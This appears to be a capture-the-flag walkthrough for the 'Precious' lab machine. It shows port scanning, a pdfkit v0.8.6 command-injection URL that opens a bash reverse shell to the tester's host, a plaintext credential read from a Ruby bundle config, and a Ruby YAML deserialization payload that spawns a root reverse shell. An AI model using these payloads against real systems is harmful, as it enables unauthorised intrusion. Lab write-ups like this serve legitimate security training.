## Summary
![Box Info](/assets/img/precious/precious.png)

## Enumeration
Starting with a nmap full port scan to discover open ports:\
`sudo nmap -sC -sV -Pn -On enum/precious.nmap -v -p- 10.10.11.189`

Open ports:
- 22 - SSH
- 80 - Web Server

### Web application
The webapp allows to convert HTML pages into pdf files and the URL is controlled by the user.

\#todo: insert screen

I tried to connect to my host to see what kind of HTTP request the server was making:
```bash
$ sudo nc -nvlp 80    
listening on [any] 80 ...
connect to [10.10.16.19] from (UNKNOWN) [10.10.11.189] 54878
GET /aaa HTTP/1.1
Host: 10.10.16.19
User-Agent: Mozilla/5.0 (Unknown; Linux x86_64) AppleWebKit/602.1 (KHTML, like Gecko) wkhtmltopdf Version/10.0 Safari/602.1
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Connection: Keep-Alive
Accept-Encoding: gzip, deflate
Accept-Language: en-US,*
```
From the User-Agent header I know that **wkhtmltopdf** was used but I cannot find anything useful to exploit this version, so, I tried to convert a page to see the result.
Checking the dev console on the generated PDF page I noted a log which contains the software and the version used (pdfkit v0.8.6)

![Pdfkit](/assets/img/precious/pdf-kit-version.png)

## Gain access

### PdfKit RCE
PdfKit v0.8.6 is vulnerable to RCE (https://security.snyk.io/vuln/SNYK-RUBY-PDFKIT-2869795) if the URL contains a query parameter named `name` which contains a URL encoded char and a query string substitution shell command.

I used this url in the webapp input and I got back a reverse shell\
```
http://example.com/?name=#{'%20`bash -c "bash -i >& /dev/tcp/10.10.16.19/9000 0>&1"`'}
```


```bash
$ nc -nvlp 9000
listening on [any] 9000 ...
connect to [10.10.16.19] from (UNKNOWN) [10.10.11.189] 46934
bash: cannot set terminal process group (679): Inappropriate ioctl for device
bash: no job control in this shell
bash-5.1$ 
```

The shell was executed as `ruby` user. So I needed to escalate my privileges.
I checked the `/etc/passwd` file:

```bash
$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
henry:x:1000:1000:henry,,,:/home/henry:/bin/bash
ruby:x:1001:1001::/home/ruby:/bin/bash
```

## Privilege Escalation to henry
The target user is `henry`. I checked services executed by this user but I didn't found anything useful.\
I started searching for credentials and in ruby's home there was a file in `.bundle/` with `henry` credentials.

```bash
$ cat /home/ruby/.bundle/config 
---
BUNDLE_HTTPS://RUBYGEMS__ORG/: "henry:Q3c1AqGHtoI0aXAYFH"
```

Use this credentials to login in SSH as henry and grab user flag

## Privilege Escalation to root
User henry can execute a specific ruby command as root:

```bash
$ sudo -l
User henry may run the following commands on precious:
    (root) NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
```
The file `update_dependecies.rb` read a yaml file in the pwd called dependencies.yml (an example is stored in /opt/sample)

Ruby YAML module load function is vulnerable to RCE: https://staaldraad.github.io/post/2021-01-09-universal-rce-ruby-yaml-load-updated/

Use this input in dependecies.yml to obtain a reverse shell as root:
```yaml
---
- !ruby/object:Gem::Installer
	i: x
- !ruby/object:Gem::SpecFetcher
	i: y
- !ruby/object:Gem::Requirement
requirements:
!ruby/object:Gem::Package::TarReader
io: &1 !ruby/object:Net::BufferedIO
io: &1 !ruby/object:Gem::Package::TarReader::Entry
read: 0
header: "abc"
debug_output: &1 !ruby/object:Net::WriteAdapter
socket: &1 !ruby/object:Gem::RequestSet
sets: !ruby/object:Net::WriteAdapter
socket: !ruby/module 'Kernel'
method_id: :system
git_set: "bash -c 'bash -i >& /dev/tcp/<myip>/9000 0>&1'"
method_id: :resolve
```

```bash
# On the box
$ sudo ruby /opt/update_dependencies.rb
...
# On my host
$ nc -nvlp 9000
listening on [any] 9000 ...
connect to [10.10.16.19] from (UNKNOWN) [10.10.11.189] 54586
root@precious:/root#
```

Now we can grab root flag!
